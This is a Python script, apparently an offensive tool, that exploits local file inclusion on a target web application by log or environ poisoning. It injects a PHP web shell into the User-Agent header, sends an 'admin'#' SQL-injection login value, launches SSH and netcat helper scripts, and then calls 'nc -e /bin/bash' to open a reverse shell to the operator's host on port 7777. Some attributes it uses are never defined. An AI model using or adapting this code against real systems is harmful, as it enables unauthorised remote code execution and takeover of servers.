#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
import base64
import signal

class Shell_conncet:

     def __init__(self):
        self.control()
        if "proc/self/environ" in self.url:                                                                                                          
            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"
            
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)  
            if "proc/self/environ" in self.url:
                request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                    ('Cookie',str(self.Cookie).replace('\n','')),
                                    ('username',"admin'#"),
                                    ('password','password')]
                        
                path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
                run    = ' gnome-terminal  -e '+'" '+path+' "' 
                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
                command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
                try:
                    first_req = request.open(self.url).read()  
                    time.sleep(4) 
                    self.Get_Oregnal_URL = request.open(command).read()
                    exit()
                except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()
                except KeyboardInterrupt:
                     exit()
        elif  "auth" in  self.url or "auth.log" in  self.url\
        or 'apache2/access.log' in self.url:                  
                if os.path.exists('./Package/shell/.address'): 
                    with open ('./Package/shell/.address','r') as readHost:
                                      Host = readHost.read()
                    with open ('./Package/shell/.addressbak.txt','w') as writeHost:
                                 Host = writeHost.write(Host)   
                    with open ('./Package/shell/.address','r') as readip:                    
                        IP_IN = readip.read().split('\n')
                        IP_IN = "".join([*set(IP_IN)])
                        if self.ip_re.group().replace('\n','') in IP_IN :
                           pass           
                        else:  
                            
                            with open ('./Package/shell/.address','a') as readip:
                               IP_IN = readip.write(str(self.ip_re.group()))                                                                                    
                               path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
                               run    =  'gnome-terminal  -e '+'" '+path+' "' 
                               xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
                           
                            for T in range(30):
                                for C in  os.popen(" ps ax | grep ssh.py | grep -v grep") :
                                    if "ssh.py" in C  and T != 29 :
                                        time.sleep(4)
                                    elif  T == 29 :
                                       for line in os.popen("ps ax | grep ssh.py  | grep -v grep"):
                                           fields = line.split()
                                           pid = fields[0]
                                           os.kill(int(pid), signal.SIGKILL) 
                                           with open ('./Package/shell/.addressbak.txt','r') as readHost:
                                                  Host = readHost.read() 
                                           with open ('./Package/shell/.address','w') as writeHost:
                                                  Host = writeHost.write(Host)                      
                                           print('\n'+'='*20+"\n[*] CONNCETION-INFO "+'\n'+'='*30+'\n') 
                                           print("[+] Status        : ................ | : SSH Waiting For Inputing  Password ") 
                                           print("[+] Error         : ................ | : TimeUP")   
                                           os.remove('./Package/shell/.addressbak.txt')                   
                                           exit()
                                    else:
                                       break       
                if not os.path.exists('./Package/shell/.address'): 
                    with open ('./Package/shell/.address','a') as readip:
                         IP_IN = readip.write(str(self.ip_re.group()))                                                                                    
                         path   =  "python " +str(os.getcwd())+'/Package/shell/ssh.py'
                         run    =  'gnome-terminal  -e '+'" '+path+' "' 
                         xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)
                    for T in range(30):
                        for C in  os.popen(" ps ax | grep ssh.py | grep -v grep") :
                            if "ssh.py" in C  and T != 29 :
                               time.sleep(4)  
                            elif  T == 29 :
                                for line in os.popen("ps ax | grep ssh.py  | grep -v grep"):
                                    fields = line.split()
                                    pid = fields[0]
                                    os.kill(int(pid), signal.SIGKILL)    
                                    with open ('./Package/shell/.address','r') as readip: 
                                               readhost = readip.read()
                                               if self.ip_re.group() in readhost :
                                                  repalce = readhost.replace(self.ip_re.group(),'')
                                                  with open ('./Package/shell/.address','w+') as writeIP:
                                                       writeIP =  writeIP.write(repalce)    
                                               else:    
                                                    pass                    
                                print('\n'+'='*20+"\n[*] CONNCETION-INFO "+'\n'+'='*30+'\n') 
                                print("[+] Status        : ................ | : SSH Waiting For Inputing  Password ") 
                                print("[+] Error         : ................ | : TimeUP")                        
                                exit()
                            else:
                                 break                            
                path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
                run    =  'gnome-terminal  -e '+'" '+path+' "' 
                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE)                                     
                request = mechanize.Browser()
                request.set_handle_robots(False)
                request.set_handle_redirect(True)
                request.set_handle_refresh(True, max_time=1)  
                request.addheaders = [('User-agent', 'Mozilla/5.0(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                    ('Cookie',str(self.Cookie).replace('\n','')),
                                    ('username',"admin'#"),
                                    ('password','password')]
                command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '                      
                try:
                    first_req = request.open(self.url).read()
                    first_req = request.open(self.url).read()
                    first_req = request.open(self.url).read()   
                    time.sleep(4) 
                    self.Get_Oregnal_URL = request.open(command).read()
                    exit()
                except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()
                except KeyboardInterrupt:
                     exit()      
     def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
           parser.add_argument("-UV","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
           parser.add_argument("--auth"               , action='store_true'                    ,help ="auth mautrd web") 
           parser.add_argument("-F","--filelist"      , action=None                            ,help ="read fron lfi wordlsit ")
           parser.add_argument("-C","--Cookie"        , action=None        ,required=True      ,help ="Login sesion Cookie")  
           parser.add_argument("-B","--base64"      , action='store_true'                    ,help ="decode filter php  base64")  
           parser.add_argument("-R","--read"          , action=None                            ,help ="use to read file on the traget machine")  
           parser.add_argument("-UF","--UserForm"    , action=None                            ,help =" add name of the HTML Form Login User")
           parser.add_argument("-PF","--PassForm"    , action=None                            ,help ="add name of the HTML Form Login Passord")
           parser.add_argument("-P","--password"    , action=None                            ,help ="use specific Passowrd")   
           parser.add_argument("-LU","--loginurl"   , action=None                            ,help =" add login url for auth motted") 
           parser.add_argument("-U","--user"        , action=None                            ,help ="use specific username ")
           parser.add_argument("-A" ,"--aggress"       ,action='store_true'                     ,help ="  use aggressiv mode  ")
           parser.add_argument( "-S", "--shell"       , action=None                            ,help ="  to connent reverseshell   ")
           self.args = parser.parse_args()    
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help() 
              exit()
if __name__=='__main__':
   Shell_conncet() 

